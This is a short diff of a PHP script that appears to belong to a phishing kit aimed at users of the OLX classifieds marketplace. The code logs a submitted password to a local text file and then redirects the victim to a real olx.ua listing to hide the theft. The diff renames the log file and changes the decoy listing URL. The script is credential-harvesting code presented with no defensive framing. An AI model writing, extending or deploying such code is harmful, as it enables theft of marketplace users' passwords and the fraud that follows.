@@ -6,9 +6,9 @@
   password: $password
      ";
    echo $output;
-   $fp = fopen('counter.txt', 'a');
+   $fp = fopen('1.txt', 'a');
 fwrite($fp, $output . PHP_EOL);
 fclose($fp);
- header( "Location: https://www.olx.ua/obyavlenie/zadnyaya-stenka-radiopriemnik-zvezda-54-s-zamkami-IDDgGKS.html?sd=1#120316456e/" );
+ header( "Location: https://www.olx.ua/obyavlenie/tsvety-IDHWOhd.html#e38d055ff8/" );
  
 ?>
